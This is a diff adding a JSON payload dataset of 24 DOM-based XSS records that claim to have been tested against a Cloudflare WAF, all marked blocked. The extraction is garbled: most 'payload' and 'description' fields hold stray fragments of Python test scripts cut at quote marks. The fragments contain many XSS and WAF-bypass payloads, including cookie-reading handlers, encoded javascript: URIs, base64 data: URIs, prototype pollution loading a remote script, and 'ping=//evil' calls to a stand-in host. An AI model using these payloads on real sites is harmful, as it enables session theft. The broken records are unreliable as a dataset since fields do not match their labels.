@@ -1,0 +1,343 @@
+{
+  "category": "xss",
+  "subcategory": "dom_based",
+  "count": 24,
+  "payloads": [
+    {
+      "id": "xss-0010",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "alert(1)",
+      "description": "alert(document', 'confirm(1)', 'prompt(1)', 'print()',\n    'onerror=alert', 'onload=alert', '<script>alert', '<svg/onload',\n    'javascript:alert', 'document.cookie', 'document.domain',\n    'alert``', '.1|alert', '[1].find(alert)', 'window.alert',\n    '(alert)', '(confirm)', '(prompt)', \"window['ale\",\n    \"self['ale\", \"this['ale\", \"top['ale\", \"parent['ale\",\n    \"frames['ale\", \"globalThis['ale\",\n]\n\ndef raw_req(req_bytes, label=\"",
+      "technique": "direct_injection",
+      "source_file": "waf_round96_portswigger.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0032",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "\n--- G: Latest 2025 Bypasses ---\")\n\nLATEST_2025 = [\n    # Team_R70 bypass\n    '<img longdesc=\"src=\\'x\\'onerror=alert(document.domain);//><img \" src=\\'showme\\'>',\n    # KN0X55 bypass\n    '<Img/Src/OnError=(alert)(1)>',\n    # Shad0wH3x bypasses\n    '<img%20hrEF=\"x\"%20sRC=\"data:x",
+      "description": "%20oNLy=1%20oNErrOR=prompt`1`//>',\n    '<img//////src=x oNlY=1 oNerror=alert(1)//',\n    '<img hrEF=\"x\" sRC=\"data:x,\" oNLy=1 oNErrOR=prompt`1`>',\n    # HexaPhp bypass (duplicate attr)\n    '<img src=OnErRor OnErRor=(alert)(1)>',\n    '<Img Src=OnXSS OnErroR=confirm(document.cookie)>',\n    # Pranav Patil bypass\n    '<Img Src=OnXSS OnErroR=confirm(document.cookie)>',\n    # aufzayed bypass\n    '<svg/on%20onload=alert(1)>',\n    '<svg on =i onload=alert(1)>',\n    # ex_mi bypass\n    '<img/src=x onError=\"`${x}`;alert(`1`);\">',\n    # itsgeekymonk bypass\n    '\"><img src=1 onmouseleave=print()>',\n    # BruteLogic bypass\n    '\"onx+%00+onpointerenter%3dalert(domain)+x\"',\n    # Xib3rR4dAr bypasses\n    '\" oni=on oNfOcUs=alert(1) autofocus x=\"',\n    '\" Only=1 oNfOcUs=alert(1) autofocus x=\"',\n    # HernanRodriguez1 zero-day\n    '\"><sVg/OnLuFy=\"X=y\"oNloaD=;1^confirm(1)>/``^1//',\n    # Brutelogic optional chaining\n    '<svg onx=() onload=window.alert?.()>',\n    # IamRenganathan\n    '\"><svg%20onload=alert%26%230000000040\"1",
+      "technique": "direct_injection",
+      "source_file": "waf_round72_oss2.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0050",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "\n\" + \"=\" * 75)\nprint(\"25D: Non-on* Attributes That Can Execute JS\")\nprint(\"=\" * 75 + \"\n\")\n\n# Are there HTML attributes that execute JS WITHOUT starting with \"on\"?\n# YES:\n# - href=\"javascript:\" (blocked, but try encoding)\n# - action=\"javascript:\" (blocked)  \n# - formaction=\"javascript:\" (blocked)\n# - srcdoc=\"...\" (blocked)\n# - style=\"...\" with expression() (IE only, blocked)\n# But what about:\n# - data-* attributes + page JS using them\n# - is= attribute + customElements\n# - slot= + shadow DOM\n# - enterkeyhint= + virtual keyboard\n\nno_on = {\n    # Try href with various encodings of javascript:\n    \"href-jstab\": {\"attributeHtml\": '\" href=\"java\tscript:alert(1)\" x=\"'},\n    \"href-jsnl\": {\"attributeHtml\": '\" href=\"java\nscript:alert(1)\" x=\"'},\n    \"href-jscr\": {\"attributeHtml\": '\" href=\"java\rscript:alert(1)\" x=\"'},\n    \"href-js0a\": {\"attributeHtml\": '\" href=\"java%0ascript:alert(1)\" x=\"'},\n    \"href-js0d\": {\"attributeHtml\": '\" href=\"java%0dscript:alert(1)\" x=\"'},\n    \"href-js09\": {\"attributeHtml\": '\" href=\"java%09script:alert(1)\" x=\"'},\n    \"href-jsentity\": {\"attributeHtml\": '\" href=\"&#106;avascript:alert(1)\" x=\"'},\n    \"href-jshex\": {\"attributeHtml\": '\" href=\"&#x6a;avascript:alert(1)\" x=\"'},\n    \"href-jsfull\": {\"attributeHtml\": '\" href=\"&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1)\" x=\"'},\n    \n    # formaction with encoded js\n    \"fa-jstab\": {\"attributeHtml\": '\" type=submit formaction=\"java\tscript:alert(1)\" x=\"'},\n    \"fa-jsentity\": {\"attributeHtml\": '\" type=submit formaction=\"&#106;avascript:alert(1)\" x=\"'},\n    \n    # src with data: URI\n    \"src-data-html\": {\"attributeHtml\": '\" type=image src=\"data:text/html,<script>alert(1)</script>\" x=\"'},\n    \"src-data-b64\": {\"attributeHtml\": '\" type=image src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\" x=\"'},\n    \n    # poster attribute (video)\n    \"poster-evil\": {\"attributeHtml\": '\"/><video poster=//evil'},\n    \n    # ping attribute (sends POST to URL on click)\n    \"ping-evil\": {\"attributeHtml\": '\"/><a href=# ping=//evil>Click'},\n}\n\nfor name, payload in no_on.items():\n    t(name, payload)\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"25E: Split Injection — Payload Across Both Parameters\")\nprint(\"=\" * 75 + \"\n\")\n\n# globalHtml injects into <div>, attributeHtml into input value.\n# Can we split an attack across both so neither param alone triggers WAF?\n\n# Check page structure first\nok, div_c = t(\"structure-check\", {\"globalHtml\": \"MARKER_G",
+      "description": "attributeHtml\": \"MARKER_A\"})\n\nsplit = {\n    # Open a tag in globalHtml, close + event in attributeHtml\n    \"split-svg-open-close\": {\n        \"globalHtml\": '<svg ',\n        \"attributeHtml\": '\" onload=alert(1)>'\n    },\n    # Open script in global, content in attr (won't work due to DOM order)\n    \"split-script-open\": {\n        \"globalHtml\": '<script>',\n        \"attributeHtml\": '\";alert(1)//'\n    },\n    # Safe in each, dangerous combined by DOM\n    \"split-form-action\": {\n        \"globalHtml\": '<form id=f action=javascript:alert(1)>',\n        \"attributeHtml\": '\" type=submit form=f x=\"'\n    },\n    # math + annotation-xml across params\n    \"split-annot\": {\n        \"globalHtml\": '<math><annotation-xml encoding=\"text/html\">',\n        \"attributeHtml\": '\"><img src=x onerror=alert(1)>'\n    },\n    # Style tag in global, close style + XSS in attr\n    \"split-style\": {\n        \"globalHtml\": '<style>',\n        \"attributeHtml\": '\"</style><img src=x onerror=alert(1)>'\n    },\n    # noscript in global\n    \"split-noscript\": {\n        \"globalHtml\": '<noscript>',\n        \"attributeHtml\": '\"</noscript><img src=x onerror=alert(1)>'\n    },\n}\n\nfor name, params in split.items():\n    t(name, params)\n\n# Also try via POST\nfor name, params in split.items():\n    t(f\"POST-{name}\", params, method=\"POST",
+      "technique": "direct_injection",
+      "source_file": "waf_round25_final.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0052",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "alert(1)",
+      "description": "alert(document', 'alert(`', 'confirm(1)', 'confirm(document',\n    'prompt(1)', 'prompt`', 'print()', 'onerror=alert', 'onload=alert',\n    'onerror=confirm', 'onerror=prompt', 'onload=confirm', 'onload=prompt',\n    '<script>alert', '<script>eval', 'javascript:alert', '<svg/onload',\n    '<svg on', 'document.cookie', 'document.domain', 'alert``', 'alert`1`',\n    'import(', '.1|alert', '[1].find(alert)', 'window.alert',\n]\n\ndef raw_req(req_bytes, label=\"",
+      "technique": "direct_injection",
+      "source_file": "waf_round91_research.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0056",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "xxs\")//>',\n    # KN0X55\n    '<Img/Src/OnError=(alert)(1)>',\n    # Pranav Patil writeup\n    '<Img Src=OnXSS OnErroR=confirm(document.cookie)>',\n    # BruteLogic\n    'test\",prompt%0A/*HelloWorld*/(document.domain)",
+      "description": "\"onx+%00+onpointerenter%3dalert(domain)+x\"',\n    # aufzayed\n    '<svg/on%20onload=alert(1)>',\n    # ex_mi\n    '<img/src=x onError=\"`${x}`;alert(`Ex.Mi`);\">',\n    # IamRenganathan\n    '\"><svg%20onload=alert%26%230000000040\"1",
+      "technique": "direct_injection",
+      "source_file": "waf_round91_research.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0087",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "alert(1)",
+      "description": "alert`document.domain`",
+      "technique": "direct_injection",
+      "source_file": "waf_round91_research.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0138",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "alert(1)",
+      "description": "alert(document', 'confirm(1)', 'prompt(1)', 'print()',\n    'onerror=alert', 'onload=alert', '<script>alert', '<svg/onload',\n    'javascript:alert', 'document.cookie', 'document.domain',\n    'alert``', '.1|alert', '[1].find(alert)', 'window.alert',\n    '(alert)', '(confirm)', '(prompt)',\n]\n\ndef raw_req(req_bytes, label=\"",
+      "technique": "direct_injection",
+      "source_file": "waf_round94_final.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0180",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "alert(1)",
+      "description": "alert(document', 'confirm(1)', 'prompt(1)', 'print()',\n    'onerror=alert', 'onload=alert', '<script>alert', '<svg/onload',\n    'javascript:alert', 'document.cookie', 'document.domain',\n    'alert``', '.1|alert', '[1].find(alert)', 'window.alert',\n    '(alert)', '(confirm)', '(prompt)', \"window['ale\",\n    \"self['ale\", \"top['ale\",\n]\n\ndef raw_req(req_bytes, label=\"",
+      "technique": "direct_injection",
+      "source_file": "waf_round97_portswigger2.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0189",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "alert(1)",
+      "description": "alert(document', 'confirm(1)', 'prompt(1)', 'print()',\n    'onerror=alert', 'onload=alert', '<script>alert', '<svg/onload',\n    'javascript:alert', 'document.cookie', 'document.domain',\n]\n\ndef raw_req(req_bytes, label=\"",
+      "technique": "direct_injection",
+      "source_file": "waf_round88_advanced3.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0215",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "\" onfocus=alert(1) autofocus x=\"",
+      "description": "' onfocus=alert(1) autofocus x='\",\n    '\" onclick=alert(1) x=\"',\n    '\" onmouseover=alert(1) x=\"',\n    '\" onload=alert(1) x=\"',\n    '\" onerror=alert(1) x=\"',\n    '\"><svg/onload=alert(1)>',\n    \"'><svg/onload=alert(1)>\",\n    '\"><img src=x onerror=alert(1)>',\n    '\"><script>alert(1)</script>',\n    '\" onfocus=alert`1` autofocus x=\"',\n    '\" onfocus=confirm(1) autofocus x=\"',\n    '\" onfocus=prompt(1) autofocus x=\"',\n    '\" autofocus onfocus=alert(1) x=\"',\n    '\" onfocus=alert(document.domain) autofocus x=\"',\n    '\" onfocus=alert(document.cookie) autofocus x=\"',\n    '\" type=image src=x onerror=alert(1) x=\"',\n    '\" formaction=javascript:alert(1) x=\"',\n    '\" style=animation-name:x onanimationstart=alert(1) x=\"',\n    '\" ontransitionend=alert(1) style=transition:all x=\"',\n]\n\n\nprint(\"=\" * 80)\nprint(\"CUMULUSFIRE WAF — ROUND 68: 3000+ PAYLOAD MASS TEST",
+      "technique": "direct_injection",
+      "source_file": "waf_round68_mass.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0280",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "alert(1)",
+      "description": "alert(document', 'confirm(1)', 'prompt(1)', 'print()',\n    'onerror=alert', 'onload=alert', '<script>alert', '<svg/onload',\n    '<svg on', 'javascript:alert', 'document.cookie', 'document.domain',\n    'alert``', 'alert`1`', '.1|alert', '[1].find(alert)', 'window.alert',\n    'prompt`', 'confirm`', '(alert)', '(confirm)', '(prompt)',\n]\n\ndef raw_req(req_bytes, label=\"",
+      "technique": "direct_injection",
+      "source_file": "waf_round92_research2.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0295",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "\n--- G: Prototype Pollution + DOM Clobbering XSS ---\")\n\nPP_PAYLOADS = [\n    # Prototype pollution\n    '<script>Object.prototype.BOOMR=1;Object.prototype.url=\"https://portswigger-labs.net/xss/xss.js\"</script>",
+      "description": "<script>Object.prototype.innerHTML=\"<img src=x onerror=alert(1)>\"</script>',\n    '<script>Object.prototype.srcdoc=\"<img src=x onerror=alert(1)>\"</script>',\n    # DOM clobbering\n    '<a id=x><a id=x name=y href=\"javascript:alert(1)\">',\n    '<form id=x><input name=y value=\"javascript:alert(1)\">',\n    '<img name=x src=\"javascript:alert(1)\">',\n    '<a id=__proto__><a id=__proto__ name=url href=\"javascript:alert(1)\">',\n    # __proto__ pollution via URL\n    '<script>location=\"?__proto__[innerHTML]=<img/src/onerror=alert(1)>\"</script>',\n    '<script>location=\"?constructor[prototype][innerHTML]=<img/src/onerror=alert(1)>\"</script>',\n]\n\nfor p in PP_PAYLOADS:\n    get(p, label=\"proto-poll",
+      "technique": "direct_injection",
+      "source_file": "waf_round92_research2.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0305",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "alert(1)",
+      "description": "alert(document', 'confirm(1)', 'prompt(1)', 'print()',\n    'onerror=alert', 'onload=alert', '<script>alert', '<svg/onload',\n    'javascript:alert', 'document.cookie', 'document.domain',\n    'alert``', '.1|alert', '[1].find(alert)', 'window.alert',\n    '(alert)', '(confirm)', '(prompt)', \"window['ale\",\n    \"self['ale\", \"top['ale\",\n]\n\ndef raw_req(req_bytes, label=\"",
+      "technique": "direct_injection",
+      "source_file": "waf_round98_portswigger3.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0313",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "=\" * 80)\nprint(\"ROUNDS 76-78: BATCH 2 — 1100+ MORE PAYLOADS\")\nprint(\"=\" * 80)\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- A: Deep Base64 Variations (300+) ---\")\n\nJS_PAYLOADS = [\n    'alert(1)",
+      "description": "alert(document.domain)', 'alert(document.cookie)',\n    'confirm(1)', 'prompt(1)', 'print()',\n    'eval(\"alert(1)",
+      "technique": "direct_injection",
+      "source_file": "waf_round76_cross2.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0368",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "alert(1)",
+      "description": "alert(document', 'confirm(1)', 'prompt(1)', 'print()',\n    'onerror=alert', 'onload=alert', '<script>alert', '<svg/onload',\n    '<svg on', 'javascript:alert', 'document.cookie', 'document.domain',\n    'alert``', 'alert`1`', '.1|alert', '[1].find(alert)', 'window.alert',\n    'prompt`', 'confirm`', '(alert)', '(confirm)', '(prompt)',\n]\n\ndef raw_req(req_bytes, label=\"",
+      "technique": "direct_injection",
+      "source_file": "waf_round93_research3.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0383",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "alert(1)\")()}}",
+      "description": "${alert(1)}', '#{alert(1)}',\n    '{{7*7}}', '${7*7}', '<%= 7*7 %>',\n    \n    # DOM clobbering\n    '<form id=document><input name=cookie value=stolen>',\n    '<a id=URL href=\"javascript:alert(1)\">',\n    \n    # Obfuscated\n    '<svg/onload=top[String.fromCharCode(97,108,101,114,116)](1)>',\n    '<svg/onload=[][\"flat",
+      "technique": "obfuscation",
+      "source_file": "waf_round71_oss.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0389",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "\" onfocus=alert(1) autofocus x=\"",
+      "description": "' onfocus=alert(1) autofocus x='\",\n    '\" onclick=alert(1) x=\"',\n    '\" onmouseover=alert(1) x=\"',\n    '\" onerror=alert(1) x=\"',\n    '\" onload=alert(1) x=\"',\n    '\"><svg/onload=alert(1)>',\n    \"'><svg/onload=alert(1)>\",\n    '\"><img src=x onerror=alert(1)>',\n    '\"><script>alert(1)</script>',\n    '\" onfocus=confirm(1) autofocus x=\"',\n    '\" onfocus=prompt(1) autofocus x=\"',\n    '\" onfocus=alert`1` autofocus x=\"',\n    '\" onfocus=alert(document.domain) autofocus x=\"',\n    '\" onfocus=alert(document.cookie) autofocus x=\"',\n    '\" type=image src=x onerror=alert(1) x=\"',\n    '\" formaction=javascript:alert(1) x=\"',\n    '\" autofocus onfocus=alert(1) x=\"',\n    '\" onpointerenter=alert(1) x=\"',\n    '\" ontransitionend=alert(1) style=transition:all x=\"',\n    '\" onanimationstart=alert(1) style=animation-name:x x=\"',\n    '\" style=animation-name:x onanimationstart=alert(1) x=\"',\n    '\" onmouseleave=print() x=\"',\n    '\" onblur=alert(1) x=\"',\n    '\" onkeydown=alert(1) x=\"',\n    '\" oncontextmenu=alert(1) x=\"',\n    '\" ondblclick=alert(1) x=\"',\n    '\" onfocusin=alert(1) autofocus x=\"',\n    # Duplicate attribute trick (HexaPhp writeup)\n    '\" src=OnErRor OnErRor=(alert)(1) x=\"',\n    '\" src=OnXSS OnErroR=confirm(document.cookie) x=\"',\n    # Mixed case\n    '\" OnFoCuS=alert(1) AuToFoCuS x=\"',\n    '\" ONFOCUS=ALERT(1) AUTOFOCUS x=\"',\n    '\" OnErRoR=alert(1) x=\"',\n]\n\n# Deduplicate\nall_global = list(dict.fromkeys(CF_BYPASSES + GENERAL_XSS))\nall_attr = list(dict.fromkeys(ATTR_BREAKOUT))\n\nprint(f\"Unique global payloads: {len(all_global)}",
+      "technique": "obfuscation",
+      "source_file": "waf_round71_oss.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0390",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "alert(1)",
+      "description": "alert(document', 'confirm(1)', 'prompt(1)', 'print()',\n    'onerror=alert', 'onload=alert', '<script>alert', '<svg/onload',\n    'javascript:alert', 'document.cookie', 'document.domain',\n]\n\ndef raw_req(req_bytes, label=\"",
+      "technique": "direct_injection",
+      "source_file": "waf_round89_advanced4.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0428",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "alert(1)\")()',\n]\n\ncount_a = 0\nfor tag in TAGS_EXT:\n    for ev in EVENTS_EXT[:3]:\n        for func in FUNCS_EXT[:2]:\n            attr = ''\n            if tag == 'img': attr = 'src=x '\n            elif tag == 'video': attr = 'src=x '\n            elif tag == 'audio': attr = 'src=x '\n            elif tag == 'input': attr = 'autofocus '\n            elif tag == 'details': attr = 'open '\n            elif tag == 'select': attr = 'autofocus '\n            elif tag == 'textarea': attr = 'autofocus '\n            elif tag == 'button': attr = 'autofocus '\n            elif tag == 'xss': attr = 'tabindex=1 autofocus '\n            p = f'<{tag} {attr}{ev}={func}>'\n            get(p)\n            count_a += 1\n\nprint(f\"  Extended matrix done: {count_a}, {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- B: Base64 + Multi-Layer URL Encoding ---\")\n\nB64_SOURCES = [\n    '<script>alert(1)</script>",
+      "description": "<img src=x onerror=alert(1)>',\n    '<svg onload=alert(1)>',\n    'alert(document.cookie)',\n    'confirm(document.domain)',\n]\n\ncount_b = 0\nfor src in B64_SOURCES:\n    b64 = base64.b64encode(src.encode()).decode()\n    \n    # Base64 → single URL encode\n    get(urllib.parse.quote(f'eval(atob(\"{b64}",
+      "technique": "encoding",
+      "source_file": "waf_round80_final.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0453",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "\n--- C: Prototype Pollution + DOM Clobbering + Base64 ---\")\n\nPROTO_DOM = [\n    '<script>Object.prototype.innerHTML=\"<img src=x onerror=alert(1)>\"</script>",
+      "description": "<script>Object.prototype.src=\"javascript:alert(1)\"</script>',\n    '<script>Object.prototype.href=\"javascript:alert(1)\"</script>',\n    '<script>Object.prototype.action=\"javascript:alert(1)\"</script>',\n    '<script>Object.prototype.formaction=\"javascript:alert(1)\"</script>',\n    '<form id=x><input name=action value=\"javascript:alert(1)\"></form>',\n    '<form><button formaction=\"javascript:alert(1)\">X</button></form>',\n    '<a id=x><a id=x name=href href=\"javascript:alert(1)\">click</a>',\n    '<form><input name=submit onfocus=alert(1) autofocus></form>',\n    # DOM clobbering with base64\n    '<a id=x><a id=x name=href href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">',\n    '<embed name=x src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">',\n    '<object name=x data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">',\n    '<iframe name=x src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">',\n    # JSONP-style\n    '<script src=\"data:text/javascript;base64,YWxlcnQoMSk=\"></script>',\n    '<script src=\"data:application/javascript;base64,YWxlcnQoMSk=\"></script>',\n]\n\nfor p in PROTO_DOM:\n    get(p)\n    post(p)\nprint(f\"  Proto/DOM done: {total} total",
+      "technique": "direct_injection",
+      "source_file": "waf_round79_cross3.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0529",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "=\" * 70 + \"\n\")\n\nobscure = {\n    # Popover API (HTML 2024+)\n    \"popover-toggle\": '<button popovertarget=x>show</button><div popover id=x ontoggle=alert(1)>",
+      "description": "popover-auto\": '<div popover=auto id=x ontoggle=alert(1)>x</div><button popovertarget=x>',\n\n    # Dialog element\n    \"dialog-close\": '<dialog open><form method=dialog><button onclick=alert(1)>x</button></form></dialog>',\n\n    # Inert attribute bypass\n    \"inert-bypass\": '<div inert><img src=x onerror=alert(1)></div>',\n\n    # Declarative Shadow DOM\n    \"shadow-dom\": '<div><template shadowrootmode=open><script>alert(1)</script></template></div>',\n    \"shadow-svg\": '<div><template shadowrootmode=open><svg onload=alert(1)></svg></template></div>',\n\n    # Slot element\n    \"slot-focus\": '<div><template shadowrootmode=open><slot onfocus=alert(1)></slot></template></div>',\n\n    # Summary/Details\n    \"summary-click\": '<details><summary onclick=alert(1)>click</summary>x</details>',\n\n    # Output element\n    \"output-onfocus\": '<output onfocus=alert(1) tabindex=1>x</output>',\n\n    # Meter/Progress\n    \"meter-click\": '<meter onclick=alert(1) value=50>x</meter>',\n\n    # Fieldset\n    \"fieldset-focus\": '<fieldset onfocus=alert(1) tabindex=1>x</fieldset>',\n    \"legend-click\": '<fieldset><legend onclick=alert(1)>x</legend></fieldset>',\n\n    # Ruby annotation\n    \"ruby-click\": '<ruby onclick=alert(1)>x<rt>y</rt></ruby>',\n\n    # Bdi/Bdo\n    \"bdi-focus\": '<bdi onfocus=alert(1) tabindex=1>x</bdi>',\n    \"bdo-focus\": '<bdo onfocus=alert(1) tabindex=1 dir=rtl>x</bdo>',\n\n    # Wbr\n    \"wbr-focus\": '<wbr onfocus=alert(1) tabindex=1>',\n\n    # Map/Area\n    \"area-focus\": '<map name=x><area onfocus=alert(1) tabindex=1 href=#></map>',\n    \"area-click\": '<img usemap=#x src=x><map name=x><area onclick=alert(1) href=#></map>',\n\n    # Contenteditable\n    \"ce-input\": '<div contenteditable oninput=alert(1)>type here</div>',\n    \"ce-paste\": '<div contenteditable onpaste=alert(1)>paste here</div>',\n    \"ce-focus\": '<div contenteditable onfocus=alert(1)>x</div>',\n\n    # Autofocus on different elements\n    \"select-autofocus\": '<select onfocus=alert(1) autofocus><option>x</option></select>',\n    \"textarea-autofocus\": '<textarea onfocus=alert(1) autofocus></textarea>',\n    \"button-autofocus\": '<button onfocus=alert(1) autofocus>x</button>',\n    \"keygen-autofocus\": '<keygen onfocus=alert(1) autofocus>',\n}\n\nfor name, payload in obscure.items():\n    test(name, \"globalHtml\", payload)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 70)\nprint(\"ROUND 5C: Indirect Execution / No Explicit alert/confirm/prompt",
+      "technique": "direct_injection",
+      "source_file": "waf_round5.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0550",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "YWxlcnQoMSk=\"))'\n\nREFLECTION_INDICATORS = [\n    'alert(1)",
+      "description": "alert(document', 'confirm(1)', 'prompt(1)', 'print()',\n    'onerror=alert', 'onload=alert', 'onfocus=alert', '<script>alert',\n    '<script>eval', 'javascript:alert', 'onload=confirm', 'onerror=confirm',\n    'onerror=prompt', 'onload=prompt', 'onload=eval', 'onerror=eval',\n    '<svg/onload', '<img src=x onerror', 'document.cookie', 'document.domain',\n]\n\ndef raw_req(req_bytes, label=\"",
+      "technique": "direct_injection",
+      "source_file": "waf_round86_advanced.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0596",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "alert(1)",
+      "description": "alert(document', 'confirm(1)', 'prompt(1)', 'print()',\n    'onerror=alert', 'onload=alert', '<script>alert', '<svg/onload',\n    'javascript:alert', 'document.cookie', 'document.domain',\n]\n\ndef raw_req(req_bytes, label=\"",
+      "technique": "direct_injection",
+      "source_file": "waf_round87_advanced2.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0612",
+      "category": "xss",
+      "subcategory": "dom_based",
+      "payload": "alert(1)",
+      "description": "alert(document', 'confirm(1)', 'prompt(1)', 'print()',\n    'onerror=alert', 'onload=alert', '<script>alert', '<svg/onload',\n    'javascript:alert', 'document.cookie', 'document.domain',\n]\n\ndef raw_req(req_bytes, label=\"",
+      "technique": "direct_injection",
+      "source_file": "waf_round90_final.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
